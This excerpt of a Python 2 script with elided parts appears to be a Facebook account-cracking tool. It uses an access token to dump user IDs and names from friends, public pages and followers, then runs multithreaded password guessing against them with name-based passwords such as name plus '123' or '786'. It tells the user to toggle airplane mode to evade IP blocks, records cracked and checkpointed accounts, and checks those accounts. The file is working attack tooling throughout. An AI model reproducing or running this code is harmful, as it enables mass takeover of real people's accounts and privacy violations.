...
def masuk():
    ...
    print("%s[1] Login With token"%(p))
    print("[2] How to get tokens")
    print("%s | "%(B))
    jeck = raw_input("%s[•] Input "%(p))
    if jeck in(""):
    	jalan("[•] Fill it properly");exit()
    elif jeck in ('1','01'):
        jalan("\n%s[•] Enter the token to connect the account to the server"%(p))
    	jeeck = raw_input("\n[•] Enter token : ")
        if jeeck in(""):
        	jalan("%s[•] Fill in the correct token"%(m));exit()
    	try:
            nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(jeeck)).json()['name']
            jalan("%s[•] Login Success broo"%(B))
            open('data/token.txt', 'w').write(jeeck);___Jeeck___xnano___lawack___xnxx___()
        except (KeyError,IOError):
                jalan("%s[•] Token modar dinggo wae"%(m));masuk()
    elif jeck in ('2', '02'):
    	 jalan("%s | "%(B))
         jalan("%s[•] First Subscribe My Channel"%(p))
         os.system("xdg-open https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw");exit()
...
def menu():
    ...
    try:
        ...
        print("[•] Token Expired");os.system("rm -rf data/token.txt");masuk()
    try:
    ...
    print("%s |--------------------------------------------- "%(B))
    print("%s[1] Crack id from friends/public "%(P))
    print("[2] Crack id from mass public")
    print("[3] Crack id from Public Account %sNew Account"%(b))
    print("%s[4] Crack id from followers"%(p))
    print("%s[5] Seting useragent"%(P))
    print("[6] Check total crack")
    print("[7] Check cp Account")
    print("%s[0] Log Out"%(m))
    print("%s | "%(B))
    pantek = raw_input("%s[•] Input : "%(P))
    if pantek == '':
        jalan("%s[•] Select Correct option "%(m));menu()
    elif pantek in['1','01']:
        publik(jeeckxd)
    elif pantek in['2','02']:
        sunatmasal()
...
#                print("%s | "%(B))
            ...
            print("%s | "%(B))
            pel= raw_input("%s[•] input file : "%(B))
            if pel == "":
                print("[•] File not found")
            total = open("got/%s"%(file)).read().splitlines()
            jalan("%s ------------------------------------------------------"%(B))
            nm_file = ("%s"%(file)).replace("-", " ")
            print("%s[•] Total account : %s "%(p,len(total)))
            print("%s | %s"%(B,p))
            for akun in total:
            	fb = akun.replace("\n","")
            ...
            print("%s | "%(B))
            raw_input("%s [•] Press enter to return"%(p));menu()
        except (IOError):
            print("%s | "%(B))
            print("%s[•] No results"%(p))
            print("%s | "%(B))
            raw_input("%s[•] Press enter to return to menu"%(p));menu()
    elif pantek in['7','07']:
        cek_file()
        cek_opsi()
    elif pantek in['0','00']:
        ...
        print("successfully deleted");exit()
...
def muda_():
    try:
        ...
        print("%s[•] Token Eror");exit()
    try:
        print("%s | "%(B))
        print("%s[•] How many ids do you want to dump please fill in"%(p))
        tae = int(raw_input("[•] input id limit : "))
    except:
        tae = 1
    peli = raw_input("[•] For file : ")
    for zx in range(tae):
        zx +=1
        id = raw_input("[•] Enter user id %s%s : "%(b,zx))
        if id in ['',' ']:
            print("%s[•] Fill It"%(m));exit()
        try:
            ...
            print("%s | "%(B))
            print("%s | "%(B))
            print("%s[•] Total collection id : %s%s "%(P,B,len(kon)))
            print("[•] File stored di : %s%s "%(B,peli))
            print("%s | "%(B))
            raw_input("%s[•] Press enter "%(P));_start().ss()
        except (KeyError):
            print("%s[•] Fail dump id"%(m));exit()
        except (ConnectionError):
            print("%s[•] Connection error"%(m))
...
def sunatmasal():
	try:
		...
		print("%s | "%(B))
                print("%s[•] Token eror"%(p));exit()
	try:
		print("%s | "%(B))
                print("%s[•] You can type %s Me %sto dump your own friendship id"%(p,b,p))
                print("%s[•] This is a bulk id dump feature"%(k))
		tr = int(raw_input("%s[•] How many ids do you want to dump? : "%(p)))
	except:
		tr = 1
        print("%s | "%(B))
	il = raw_input("%s[•] For file : "%(p))
	for zx in range(tr):
		zx += 1
...
#				print("\r%s[•] Mengumpulkan id >>> %s%s %s<<< --  >>>> %s%s%s <<<<"%(p,b,len(id),p,b,a["name"],p)),
			...
			print("[•] Maybe the id is private / dead account");exit()
	file.close()
	__id=open(il, 'r').readlines()
        print("%s| "%(B))
	print("%s[•] Total id dump >>>>%s %s %s<<<<"%(p,b,len(__id),p))
        print("[•] The dump file is stored in : %s%s"%(B,il));_start().ss()
# DUMP PUBLIK
def publik(jeeckxd,headers=header):
    ...
    try:
    	print("%s | "%(B))
        print("%s[•] Typing %sMe%s To dump your own friendship"%(p,b,p))
...
#            print("\r%s[•] >>>> %s%s%s <<<< - >>>> %s%s%s <<<< - >>>> %s%s%s <<<<\n"%(p,b,str(len(id)),p,b,a["name"],p,b,a["id"],p)),
        ...
        _sed_.close()
        print("%s | "%(B))
        print("%s[•] The dump file is stored in : %s%s"%(p,b,file));_start().ss()
#        raw_input("%s[•] press enter"%(p));menu()
    except Exception as e:
        print("[•] FAILED TO DUMP");exit()
# DUMP FOLLOWERS
def followers(jeeck,headers=header):
    ...
    try:
        print("%s | "%(B))
    	print("%s[•] Type %sMe%s to dump your own followers"%(p,b,p))
        idt = raw_input("[•] Id target : ")
        batas = raw_input("[•] Take maximum : ")
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,jeeckxd))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        _sed_ = open(file, 'w')
        ...
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            _sed_.write(a['id'] + '<=>' + a['name'] + '\n')
            print("\r%s[•] Collect id >>>> %s%s%s <<<<"%(p,b,str(len(id)),p)),
            sys.stdout.flush();jeda(0.0050)
        _sed_.close()
        print("%s | "%(B))
        print("%s | "%(B))
        ...
        print("[•] Failed dump id");exit()
        
#### SETING USER AGENT
def useragent():
	print("%s | "%(B))
        print("%s[1] Change useragent"%(p))
        print("%s[0] Return"%(m))
        print("%s | "%(B))
	pil = raw_input("%s[•] Input : "%(p))
        if pil == "":
           print("[•] Fill it properly");exit()
        elif pil in("1", "01"):
            try:
                kontol = raw_input("[•] Enter useragent : ")
                if kontol in(""):
                   print(" Enter correctly");exit()
...
class _start():
    ...
    def ss(self):
        try:
            print("%s | "%(B))
            self.apk = raw_input("%s[•] Enter file : "%(p))
            self.id = open(self.apk).read().splitlines()
            print("[•] Amount id > %s%s%s <"%(B,len(self.id),p))
        except:
            print("[•] Fill it properly")
        ban = raw_input("[•] Want to use manual/automatic password %sM/O %s: "%(B,p))
        if ban in ('m', 'M'):
            print("[•] Example of manual password %spakistan,786786"%(B))
            while True:
                pasx = raw_input("%s[•] For password : "%(p))
                if pasx == '':
                    print("%s[•] Fill it correctly and do not be empty"%(m))
                elif len(pasx)<=5:
                    ...
                    def xxh(mex=None):
                        ...
                        if itil in(""):
                            print '%s%s true content dear'%(M,til);self.xxh()
                        elif itil in("1","01"):
                            print("[•] Total crack %s OK %ssaved in file %s+--)%s OK-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("[•] Total crack %s CP %ssaved in file %s+--)%s CP-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("%s[•]%s If the crack has exceeded 500 activate airplane mode once"%(p,b))
                            ...
                            os.remove(self.apk)
                            print("[•] crack stop ");exit()
                        elif itil in("2","02"):
                            print("[•] Total crack %s OK %ssaved in file %s+--)%s OK-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("[•] Total crack %s CP %ssaved in file %s+--)%s CP-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("%s[•] %sIf the crack has exceeded 500 activate airplane mode once"%(p,b))
                            with celeng(max_workers=30) as crack:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                            ...
                            os.remove(self.apk)
                            print("%s[•] Crack stop"%(m));exit()
                        elif itil in("3","03"):
                            print("[•] Total crack %s OK %ssaved in file %s+--)%s OK-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("[•] Total crack %s CP %saved in file %s+--)%s CP-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
                            print("%s[•] %sIf the crack has exceeded 500 activate airplane mode once"%(p,b))
                            with celeng(max_workers=30) as crack:
                                for uh in self.id:
                                    try:
                            ...
                            print("%s[•] Fill it properly"%(m));exit()
                    print("%s | "%(B))
                    print("%s[1] B-Api"%(p))
                    print("[2] Mbasic")
    ...
    def b_api(self, user, xxh):
        ...
        for pw in xxh:
            ...
            if response.status_code != 200:
            	loop +=1
            	print("\r%s[+] Ip block turn on airplane mode 3/2 seconds"%(m)),
                sys.stdout.flush()
                b_api(self, user, xxh)
            if 'session_key' in response.text and 'EAAAA' in response.text:
    ...
    def crack(self):
        ...
        if ff == '':
            print("[•] Fill proper ");menu()
        elif ff in ('1', '01'):
            print("%s | "%(B))
            print("%s[•] Total crack %s OK %sFile saved in %s+--)%s OK-%s-%s-%s.txt"%(p,b,p,b,p,ha,op,ta))
            print("[•] Total crack %s CP %sFile saved in %s+--)%s CP-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
            print("%s[•] %sIf the crack has exceeded 500 activate airplane mode 1 time"%(p,b))
            with celeng(max_workers=30) as crack:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        ...
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"1234"]
                        else:
                            pwx = [name, i[0]+"12345", i[0]+"786"]
            ...
            print '\n%s%s correct content'%(M,til);self.crack()
### CEK FILE
def cek_file():
    dirs = os.listdir("dapet")
    for peli in dirs:
    ...
    try:
    	print("%s[•] Choose what you want to check "%(P)) 
        print("%s[•] Enter sample file %s got/%s"%(P, B,peli))
    except NameError:
        print("%s[•] File not found / you have not cracked :( "%(m)) 
###  CEK OPSI :(
def cek_opsi():
    print("%s | "%(B))
    file = raw_input("%s[•] enter file : %s"%(P,b))
    if file == '':
        print("%s[•] correct"%(m));exit()
    try:
        self = open(file, 'r').readlines()
    except IOError:
        print("%s[•] File not found"%(m));exit()

    print("%s[•] Total account : %s%s"%(P,b,len(self)))
    for yes in self:
        fl = yes.replace('\n', '')
        ya = fl.split('|')
        print '\n\033[0;00m[\033[0;36m•\033[0;00m]\033[0;33m Process checking :\033[0;36m ' + fl.replace(' + ', '')
        
        try:
            check_in(ya[0].replace(' + ', ''), ya[1])
        except requests.exceptions.ConnectionError:
            print("%s[•] No connection"%(m));exit()
            continue
    print("%s[•] Process has stopped "%(B));exit()
...
def check_in(user, pasw):
    ...
    #        jalan '  \033[0;33m[\033[0;36m' + str(opt + 1) + '\033[0;33m]\033[0;00m ' + proo[opt]
        ...
        jalan("%s[•] Possibly the password has been changed"%(m))
